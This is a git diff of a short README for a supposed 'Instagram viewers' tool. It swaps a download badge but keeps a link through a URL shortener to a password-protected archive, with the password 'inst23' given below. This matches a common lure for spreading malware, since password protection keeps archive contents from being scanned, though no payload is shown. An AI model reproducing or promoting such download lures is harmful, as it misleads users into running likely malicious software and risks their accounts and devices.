@@ -1,6 +1,6 @@
 # Instagram viewers
 
-[![Download zip](https://www.mediafire.com/file/7tedelww698wz2u/Instagram+View.7z/file)](https://kurl.ru/BzWHt)
+[![Download zip](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download")](https://kurl.ru/BzWHt)
 
 |Password: inst23
 |---|
